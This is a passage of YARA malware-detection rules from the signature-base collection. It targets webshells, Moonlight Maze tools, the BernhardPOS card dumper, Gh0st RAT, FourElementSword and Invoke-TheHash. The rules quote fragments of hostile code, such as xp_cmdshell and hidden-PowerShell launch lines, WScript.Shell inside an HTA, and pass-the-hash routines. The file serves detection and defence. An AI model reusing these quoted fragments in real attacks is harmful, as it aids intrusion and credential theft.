		reference = "http://ceso.googlecode.com/svn/web/bko/filemanager/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L9092-L9107"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "f7fa5872d8eb4ba1d0b26d966d7650d70b1a10c56945d5a5340b8e1cb5d0f5f0"
		score = 60
		quality = 85
		tags = ""

	strings:
		$a1 = "<div id=\"bkorotator\"><img alt=\"\" src=\"images/rotator/1.jpg\"></div>" ascii
		$a2 = "$(\"#dialog\").dialog(\"destroy\");" ascii
		$s1 = "<form id=\"form\" action=\"ServFMUpload\" method=\"post\" enctype=\"multipart/form-data\">" ascii
		$s2 = "<input type=\"hidden\" id=\"fhidden\" name=\"fhidden\" value=\"L3BkZi8=\" />" ascii

	condition:
		all of ( $a* ) or all of ( $s* )
}

rule SIGNATURE_BASE_Webshell_Insomnia
{
	meta:
		description = "Insomnia Webshell - file InsomniaShell.aspx"
		author = "Florian Roth (Nextron Systems)"
		id = "62ed3695-9ab8-54d4-a9d2-b6270c56ccfb"
		date = "2014-12-09"
		modified = "2025-03-29"
		reference = "http://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L9109-L9130"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "e0cfb2ffaa1491aeaf7d3b4ee840f72d42919d22"
		logic_hash = "d170c60f94092a38ba4af92283debd059eef2e4c683fd7737ffd60d1a2581d9c"
		score = 80
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Response.Write(\"- Failed to create named pipe:\");" fullword ascii
		$s1 = "Response.Output.Write(\"+ Sending {0}<br>\", command);" fullword ascii
		$s2 = "String command = \"exec master..xp_cmdshell 'dir > \\\\\\\\127.0.0.1" ascii
		$s3 = "Response.Write(\"- Error Getting User Info<br>\");" fullword ascii
		$s4 = "string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes," fullword ascii
		$s5 = "[DllImport(\"Advapi32.dll\", SetLastError = true)]" fullword ascii
		$s9 = "username = DumpAccountSid(tokUser.User.Sid);" fullword ascii
		$s14 = "//Response.Output.Write(\"Opened process PID: {0} : {1}<br>\", p" ascii

	condition:
		3 of them
}

rule SIGNATURE_BASE_Soaksoak_Infected_Wordpress
{
	meta:
		description = "Detects a SoakSoak infected Wordpress site http://goo.gl/1GzWUX"
		author = "Florian Roth (Nextron Systems)"
		id = "d147af65-72de-50be-9435-bef47eb4842a"
		date = "2014-12-15"
		modified = "2025-03-29"
		reference = "http://goo.gl/1GzWUX"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L9149-L9164"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "4cba18a0d14be2795d71a1973265a1742beda57636f64c1974001ecf70e3e91d"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "wp_enqueue_script(\"swfobject\");" ascii fullword
		$s1 = "function FuncQueueObject()" ascii fullword
		$s2 = "add_action(\"wp_enqueue_scripts\", 'FuncQueueObject');" ascii fullword

	condition:
		all of ( $s* )
}

rule SIGNATURE_BASE_Aspxspy2
{
	meta:
		description = "Web shell - file ASPXspy2.aspx"
		author = "Florian Roth (Nextron Systems)"
		id = "b68e0c98-0136-58d8-a2d6-57abccb1e942"
		date = "2015-01-24"
		modified = "2025-03-29"
		reference = "not set"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L9190-L9216"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "5642387d92139bfe9ae11bfef6bfe0081dcea197"
		logic_hash = "59c88f8e2542dcde4bf5123147ea2c1ca408925ca966f3f34a4692a3ba7a0935"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "string iVDT=\"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin" ascii
		$s1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"FGEy\" AutoPostBack=\"True\" O" ascii
		$s3 = "Process[] p=Process.GetProcesses();" fullword ascii
		$s4 = "Response.Cookies.Add(new HttpCookie(vbhLn,Password));" fullword ascii
		$s5 = "[DllImport(\"kernel32.dll\",EntryPoint=\"GetDriveTypeA\")]" fullword ascii
		$s6 = "<p>ConnString : <asp:TextBox id=\"MasR\" style=\"width:70%;margin:0 8px;\" CssCl" ascii
		$s7 = "ServiceController[] kQmRu=System.ServiceProcess.ServiceController.GetServices();" fullword ascii
		$s8 = "Copyright &copy; 2009 Bin -- <a href=\"http://www.rootkit.net.cn\" target=\"_bla" ascii
		$s10 = "Response.AddHeader(\"Content-Disposition\",\"attachment;filename=\"+HttpUtility." ascii
		$s11 = "nxeDR.Command+=new CommandEventHandler(this.iVk);" fullword ascii
		$s12 = "<%@ import Namespace=\"System.ServiceProcess\"%>" fullword ascii
		$s13 = "foreach(string innerSubKey in sk.GetSubKeyNames())" fullword ascii
		$s17 = "Response.Redirect(\"http://www.rootkit.net.cn\");" fullword ascii
		$s20 = "else if(Reg_Path.StartsWith(\"HKEY_USERS\"))" fullword ascii

	condition:
		6 of them
}

rule SIGNATURE_BASE_Apt_RU_Moonlightmaze_Customsniffer
{
	meta:
		description = "Rule to detect Moonlight Maze sniffer tools"
		author = "Kaspersky Lab"
		id = "8cc76e4d-a956-543c-81e0-827dfdb5da1c"
		date = "2017-03-15"
		modified = "2023-12-05"
		reference = "https://en.wikipedia.org/wiki/Moonlight_Maze"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_moonlightmaze.yar#L50-L79"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "7b86f40e861705d59f5206c482e1f2a5"
		hash = "927426b558888ad680829bd34b0ad0e7"
		logic_hash = "5ccf9035adc16393db4b3d461f7a20f86f538275d7806280a15508c15d9c805c"
		score = 75
		quality = 85
		tags = ""
		version = "1.1"
		original_filename = "ora;tdn"

	strings:
		$a1 = "/var/tmp/gogo" fullword
		$a2 = "myfilename= |%s|" fullword
		$a3 = "mypid,mygid=" fullword
		$a4 = "mypid=|%d| mygid=|%d|" fullword
		$a5 = "/var/tmp/task" fullword
		$a6 = "mydevname= |%s|" fullword

	condition:
		2 of ( $a* )
}

rule SIGNATURE_BASE_Loki2Crypto
{
	meta:
		description = "Rule to detect hardcoded DH modulus used in 1996/1997 Loki2 sourcecode; #ifdef STRONG_CRYPTO /* 384-bit strong prime */"
		author = "Costin Raiu, Kaspersky Lab"
		id = "d67288f8-5205-5882-8dff-041d092eea4f"
		date = "2017-03-21"
		modified = "2023-12-05"
		reference = "https://en.wikipedia.org/wiki/Moonlight_Maze"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_moonlightmaze.yar#L82-L106"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "19fbd8cbfb12482e8020a887d6427315"
		hash = "ea06b213d5924de65407e8931b1e4326"
		hash = "14ecd5e6fc8e501037b54ca263896a11"
		hash = "e079ec947d3d4dacb21e993b760a65dc"
		hash = "edf900cebb70c6d1fcab0234062bfc28"
		logic_hash = "c2315dafb0ecb9e6babd526a028835f3513218c1e667c81088c49ad13dbab5be"
		score = 75
		quality = 85
		tags = ""
		version = "1.0"

	strings:
		$modulus = {DA E1 01 CD D8 C9 70 AF C2 E4 F2 7A 41 8B 43 39 52 9B 4B 4D E5 85 F8 49}

	condition:
		( any of them )
}

rule SIGNATURE_BASE_Apt_RU_Moonlightmaze_De_Tool
{
	meta:
		description = "Rule to detect Moonlight Maze 'de' and 'deg' tunnel tool"
		author = "Kaspersky Lab"
		id = "09bfebca-7cec-5514-9f48-c0c2c57efcf9"
		date = "2017-03-27"
		modified = "2017-03-27"
		reference = "https://en.wikipedia.org/wiki/Moonlight_Maze"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_moonlightmaze.yar#L111-L137"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "4bc7ed168fb78f0dc688ee2be20c9703"
		hash = "8b56e8552a74133da4bc5939b5f74243"
		logic_hash = "f658e1aa2ddb84fe3c1de7c7c00f2148d232cf2b3381c298420abfc382c02986"
		score = 75
		quality = 85
		tags = ""
		version = "1.0"

	strings:
		$a1 = "Vnuk: %d" ascii fullword
		$a2 = "Syn: %d" ascii fullword
		$a3 = {25 73 0A 25 73 0A 25 73 0A 25 73 0A}

	condition:
		(( 2 of ( $a* ) ) )
}

rule SIGNATURE_BASE_Apt_RU_Moonlightmaze_Cle_Tool
{
	meta:
		description = "Rule to detect Moonlight Maze 'cle' log cleaning tool"
		author = "Kaspersky Lab"
		id = "99ae07b9-eb42-53dc-bd8b-75ab6a0b8cab"
		date = "2017-03-27"
		modified = "2017-03-27"
		reference = "https://en.wikipedia.org/wiki/Moonlight_Maze"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_moonlightmaze.yar#L140-L167"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "647d7b711f7b4434145ea30d0ef207b0"
		logic_hash = "a4bbd7be617b944a656fa58ca9ec6384f624c95250de6b8a6ba63e7c3387484c"
		score = 75
		quality = 85
		tags = ""
		version = "1.0"

	strings:
		$a1 = "./a filename template_file" ascii wide
		$a2 = "May be %s is empty?" ascii wide
		$a3 = "template string = |%s|" ascii wide
		$a4 = "No blocks !!!"
		$a5 = "No data in this block !!!!!!" ascii wide
		$a6 = "No good line"

	condition:
		(( 3 of ( $a* ) ) )
}

rule SIGNATURE_BASE_Apt_RU_Moonlightmaze_Xk_Keylogger
{
	meta:
		description = "Rule to detect Moonlight Maze 'xk' keylogger"
		author = "Kaspersky Lab"
		id = "cf585cd0-afdd-5782-a6e5-bb9509cbf01d"
		date = "2017-03-27"
		modified = "2017-03-27"
		reference = "https://en.wikipedia.org/wiki/Moonlight_Maze"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_moonlightmaze.yar#L170-L202"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "b2acdef9c8e545f4ab217f529a7e4a3e74723b27ec89896f98639fd40792bcc8"
		score = 75
		quality = 35
		tags = ""
		version = "1.0"

	strings:
		$a1 = "Log ended at => %s"
		$a2 = "Log started at => %s [pid %d]"
		$a3 = "/var/tmp/task" fullword
		$a4 = "/var/tmp/taskhost" fullword
		$a5 = "my hostname: %s"
		$a6 = "/var/tmp/tasklog"
		$a7 = "/var/tmp/.Xtmp01" fullword
		$a8 = "myfilename=-%s-"
		$a9 = "/var/tmp/taskpid"
		$a10 = "mypid=-%d-" fullword
		$a11 = "/var/tmp/taskgid" fullword
		$a12 = "mygid=-%d-" fullword

	condition:
		(( 3 of ( $a* ) ) )
}

rule SIGNATURE_BASE_Fidelis_Advisory_Purchase_Order_Pps
{
	meta:
		description = "Detects a string found in a malicious document named Purchase_Order.pps"
		author = "Florian Roth (Nextron Systems)"
		id = "205c4cda-6874-5455-8eb9-b63fb09b13fd"
		date = "2015-06-09"
		modified = "2023-12-05"
		reference = "http://goo.gl/ZjJyti"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_fidelis_phishing_plain_sight.yar#L2-L14"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "45cfee6413accff36a39ced861a29c611d6efe24e1ca87f17467106f8565642b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Users\\Gozie\\Desktop\\Purchase-Order.gif" ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Fidelis_Advisory_Cedt370
{
	meta:
		description = "Detects a string found in memory of malware cedt370r(3).exe"
		author = "Florian Roth (Nextron Systems)"
		id = "b5ebf2d7-e3e4-5b3b-a082-417da9c7fda6"
		date = "2015-06-09"
		modified = "2023-12-05"
		reference = "http://goo.gl/ZjJyti"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_fidelis_phishing_plain_sight.yar#L16-L30"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "1070d3c63a7091c0982e67134f9dc3cd790bb0b5c2ac08f3a00e3b97ef53d64b"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "PO.exe" ascii fullword
		$s1 = "Important.exe" ascii fullword
		$s2 = "&username=" ascii fullword
		$s3 = "Browsers.txt" ascii fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Bernhardpos
{
	meta:
		description = "BernhardPOS Credit Card dumping tool"
		author = "Nick Hoffman / Jeremy Humble"
		id = "9b9e1507-cf1b-5653-beaa-458205e367c3"
		date = "2015-07-14"
		modified = "2023-12-05"
		reference = "http://morphick.com/blog/2015/7/14/bernhardpos-new-pos-malware-discovered-by-morphick"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/crime_bernhard_pos.yar#L1-L18"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "e49820ef02ba5308ff84e4c8c12e7c3d"
		logic_hash = "c00f2fda5a391b44767d918945069f18cef084dd4dc6aa94d8f945bf97ac462a"
		score = 70
		quality = 85
		tags = ""

	strings:
		$shellcode_kernel32_with_junk_code = { 33 c0 83 ?? ?? 83 ?? ?? 64 a1 30 00 00 00 83 ?? ?? 83 ?? ?? 8b 40 0c 83 ?? ?? 83 ?? ?? 8b 40 14 83 ?? ?? 83 ?? ?? 8b 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 8b 00 83 ?? ?? 83 ?? ?? 8b 40 10 83 ?? ?? }
		$mutex_name = "OPSEC_BERNHARD"
		$build_path = "C:\\bernhard\\Debug\\bernhard.pdb"
		$string_decode_routine = { 55 8b ec 83 ec 50 53 56 57 a1 ?? ?? ?? ?? 89 45 f8 66 8b 0d ?? ?? ?? ?? 66 89 4d fc 8a 15 ?? ?? ?? ?? 88 55 fe 8d 45 f8 50 ff ?? ?? ?? ?? ?? 89 45 f0 c7 45 f4 00 00 00 00 ?? ?? 8b 45 f4 83 c0 01 89 45 f4 8b 45 08 50 ff ?? ?? ?? ?? ?? 39 45 f4 ?? ?? 8b 45 08 03 45 f4 0f be 08 8b 45 f4 99 f7 7d f0 0f be 54 15 f8 33 ca 8b 45 08 03 45 f4 88 08 ?? ?? 5f 5e 5b 8b e5 5d }

	condition:
		any of them
}

rule SIGNATURE_BASE_Ghostdragon_Gh0Strat_Sample3
{
	meta:
		description = "Detects Gh0st RAT mentioned in Cylance' Ghost Dragon Report"
		author = "Florian Roth (Nextron Systems)"
		id = "6d4bb99d-28de-59c2-b6f0-6da3cac4ed73"
		date = "2016-04-23"
		modified = "2023-12-05"
		reference = "https://blog.cylance.com/the-ghost-dragon"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_ghostdragon_gh0st_rat.yar#L77-L92"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "39ddb94ac14032f88e54e413ed650277e95f6dcf66219fcf43a01aff1f10a058"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "1be9c68b31247357328596a388010c9cfffadcb6e9841fb22de8b0dc2d161c42"

	strings:
		$op1 = { 44 24 15 65 88 54 24 16 c6 44 24 }
		$op2 = { 44 24 1b 43 c6 44 24 1c 75 88 54 24 1e }
		$op3 = { 1e 79 c6 44 24 1f 43 c6 44 24 20 75 88 54 24 22 }

	condition:
		all of them
}

rule SIGNATURE_BASE_LOG_Teamviewer_Connect_Chinese_Keyboard_Layout
{
	meta:
		description = "Detects a suspicious TeamViewer log entry stating that the remote systems had a Chinese keyboard layout"
		author = "Florian Roth (Nextron Systems)"
		id = "f901818b-5150-540f-b645-686c12784a38"
		date = "2019-10-12"
		modified = "2020-12-16"
		reference = "https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/default-input-locales-for-windows-language-packs"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/log_teamviewer_keyboard_layouts.yar#L2-L21"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "ba3bc7cbdfc5a47f6bc4cd9049c52eb95d25465af107ae3d068ef785b714279a"
		score = 60
		quality = 85
		tags = ""
		limit = "Logscan"

	strings:
		$x1 = "Changing keyboard layout to: 0804" ascii
		$x2 = "Changing keyboard layout to: 042a"
		$fp1 = "Changing keyboard layout to: 08040804" ascii
		$fp2 = "Changing keyboard layout to: 042a042a" ascii

	condition:
		(#x1 + #x2 ) > ( #fp1 + #fp2 )
}

rule SIGNATURE_BASE_LOG_Teamviewer_Connect_Russian_Keyboard_Layout
{
	meta:
		description = "Detects a suspicious TeamViewer log entry stating that the remote systems had a Russian keyboard layout"
		author = "Florian Roth (Nextron Systems)"
		id = "360a1cca-2a64-5fd8-bcde-f49e1b17281e"
		date = "2019-10-12"
		modified = "2022-12-07"
		reference = "https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/default-input-locales-for-windows-language-packs"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/log_teamviewer_keyboard_layouts.yar#L23-L40"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "9de52ec41fb410fcff50d49eb7871eadd07b520c3cfa089e1eeecc580e610eaa"
		score = 60
		quality = 85
		tags = ""
		limit = "Logscan"

	strings:
		$x1 = "Changing keyboard layout to: 0419" ascii
		$fp1 = "Changing keyboard layout to: 04190419" ascii

	condition:
		#x1> #fp1
}

rule SIGNATURE_BASE_Fourelementsword_Config_File
{
	meta:
		description = "Detects FourElementSword Malware"
		author = "Florian Roth (Nextron Systems)"
		id = "488a2344-3d8d-5769-aca8-9e14f38f5eb0"
		date = "2016-04-18"
		modified = "2023-12-05"
		reference = "https://www.arbornetworks.com/blog/asert/four-element-sword-engagement/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_four_element_sword.yar#L11-L28"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "f05cd0353817bf6c2cab396181464c31c352d6dea07e2d688def261dd6542b27"
		logic_hash = "680e50998093e63a4e3c7d5338ac149efef83cdb41ceb4ce0245e8bd2ab99b84"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "01,,hccutils.dll,2" fullword ascii
		$s1 = "RegisterDlls=OurDll" fullword ascii
		$s2 = "[OurDll]" fullword ascii
		$s3 = "[DefaultInstall]" fullword ascii
		$s4 = "Signature=\"$Windows NT$\"" fullword ascii

	condition:
		4 of them
}

rule SIGNATURE_BASE_Fourelementsword_Powershell_Start
{
	meta:
		description = "Detects FourElementSword Malware"
		author = "Florian Roth (Nextron Systems)"
		id = "62affc03-a408-5d8f-99da-58dead8646c5"
		date = "2016-04-18"
		modified = "2023-12-05"
		reference = "https://www.arbornetworks.com/blog/asert/four-element-sword-engagement/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_four_element_sword.yar#L123-L137"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "9b6053e784c5762fdb9931f9064ba6e52c26c2d4b09efd6ff13ca87bbb33c692"
		logic_hash = "7b1986845d97dcd11c8baddb0b49350ad30c6fff98840275befef4ad0b906b54"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "start /min powershell C:\\\\ProgramData\\\\wget.exe" ascii
		$s1 = "start /min powershell C:\\\\ProgramData\\\\iuso.exe" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_Fourelementsword_Resn32Dll
{
	meta:
		description = "Detects FourElementSword Malware"
		author = "Florian Roth (Nextron Systems)"
		id = "3e1f6d8d-53ea-542f-ba49-39b4c86f3124"
		date = "2016-04-18"
		modified = "2023-12-05"
		reference = "https://www.arbornetworks.com/blog/asert/four-element-sword-engagement/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_four_element_sword.yar#L139-L154"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "bf1b00b7430899d33795ef3405142e880ef8dcbda8aab0b19d80875a14ed852f"
		logic_hash = "9658ae3d1267993551cfb939f75f3d78de18cbeb2f524c2576b849103f3cacdc"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "\\Release\\BypassUAC.pdb" ascii
		$s2 = "\\ResN32.dll" wide
		$s3 = "Eupdate" fullword wide

	condition:
		all of them
}

rule SIGNATURE_BASE_HTA_With_Wscript_Shell
{
	meta:
		description = "Detects WScript Shell in HTA"
		author = "Florian Roth (Nextron Systems)"
		id = "2faf74b1-c19c-53f0-ad08-be9caf5640bc"
		date = "2017-06-21"
		modified = "2023-12-05"
		reference = "https://twitter.com/msftmmpc/status/877396932758560768"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_hta_anomalies.yar#L11-L26"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "7ce2728fbd3023a6b96291cdb63f30dc9b71e5fc506f8b00ad97e3062b103478"
		score = 80
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "ca7b653cf41e980c44311b2cd701ed666f8c1dbc"

	strings:
		$s1 = "<hta:application windowstate=\"minimize\"/>"
		$s2 = "<script>var b=new ActiveXObject(\"WScript.Shell\");" ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_HTA_Embedded
{
	meta:
		description = "Detects an embedded HTA file"
		author = "Florian Roth (Nextron Systems)"
		id = "04d4c718-9dd6-5528-8712-61c9f2a16139"
		date = "2017-06-21"
		modified = "2023-12-05"
		reference = "https://twitter.com/msftmmpc/status/877396932758560768"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_hta_anomalies.yar#L28-L42"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "843f0ad5e39e5492db8ff7372f6d2038e7dbb7823ec9b33f863ab891a108b1ec"
		score = 50
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "ca7b653cf41e980c44311b2cd701ed666f8c1dbc"

	strings:
		$s1 = "<hta:application windowstate=\"minimize\"/>"

	condition:
		$s1 and not $s1 in ( 0 .. 50000 )
}

rule SIGNATURE_BASE_Invoke_Wmiexec_Gen_1
{
	meta:
		description = "Detects Invoke-WmiExec or Invoke-SmbExec"
		author = "Florian Roth (Nextron Systems)"
		id = "08b79c7d-c383-5891-af0f-31a92f1ed07d"
		date = "2017-06-14"
		modified = "2023-12-05"
		reference = "https://github.com/Kevin-Robertson/Invoke-TheHash"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_invoke_thehash.yar#L32-L51"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "12aeba5255527a337c49f1c4d1dc506a13ea02da69a8fc509c77bcb07c2135c8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "140c23514dbf8043b4f293c501c2f9046efcc1c08630621f651cfedb6eed8b97"
		hash2 = "7565d376665e3cd07d859a5cf37c2332a14c08eb808cc5d187a7f0533dc69e07"

	strings:
		$x1 = "Invoke-WMIExec " ascii
		$x2 = "$target_count = [System.math]::Pow(2,(($target_address.GetAddressBytes().Length * 8) - $subnet_mask_split))" fullword ascii
		$s1 = "Import-Module $PWD\\Invoke-TheHash.ps1" fullword ascii
		$s2 = "Import-Module $PWD\\Invoke-SMBClient.ps1" fullword ascii
		$s3 = "$target_address_list = [System.Net.Dns]::GetHostEntry($target_long).AddressList" fullword ascii
		$x4 = "Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0" ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_Invoke_Smbexec_Invoke_Wmiexec_1
{
	meta:
		description = "Auto-generated rule - from files Invoke-SMBExec.ps1, Invoke-WMIExec.ps1"
		author = "Florian Roth (Nextron Systems)"
		id = "fd1c6599-028d-5535-beb8-5b2658481b97"
		date = "2017-06-14"
		modified = "2023-12-05"
		reference = "https://github.com/Kevin-Robertson/Invoke-TheHash"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_invoke_thehash.yar#L53-L70"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "feb2973cd7e2c221cd91ec543f1d943cf1b5d5d18fe74c8f7e58341f76f95b51"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash1 = "674fc045dc198874f323ebdfb9e9ff2f591076fa6fac8d1048b5b8d9527c64cd"
		hash2 = "b41bd54bbf119d153e0878696cd5a944cbd4316c781dd8e390507b2ec2d949e7"

	strings:
		$s1 = "$process_ID = $process_ID -replace \"-00-00\",\"\"" fullword ascii
		$s2 = "Write-Output \"$Target did not respond\"" fullword ascii
		$s3 = "[Byte[]]$packet_call_ID_bytes = [System.BitConverter]::GetBytes($packet_call_ID)" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Invoke_Wmiexec_Gen
{
	meta:
		description = "Auto-generated rule - from files Invoke-SMBClient.ps1, Invoke-SMBExec.ps1, Invoke-WMIExec.ps1, Invoke-WMIExec.ps1"
		author = "Florian Roth (Nextron Systems)"
		id = "08b79c7d-c383-5891-af0f-31a92f1ed07d"
		date = "2017-06-14"
		modified = "2023-12-05"
		reference = "https://github.com/Kevin-Robertson/Invoke-TheHash"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_invoke_thehash.yar#L72-L90"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "1ee79b7ea576adb71bde903756cda7af22e55eee9c4c3964cc9edc8930083fa2"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash1 = "56c6012c36aa863663fe5536d8b7fe4c460565d456ce2277a883f10d78893c01"
		hash2 = "674fc045dc198874f323ebdfb9e9ff2f591076fa6fac8d1048b5b8d9527c64cd"
		hash3 = "b41bd54bbf119d153e0878696cd5a944cbd4316c781dd8e390507b2ec2d949e7"

	strings:
		$s1 = "$NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)" fullword ascii
		$s2 = "$client_challenge = [String](1..8 | ForEach-Object {\"{0:X2}\" -f (Get-Random -Minimum 1 -Maximum 255)})" fullword ascii
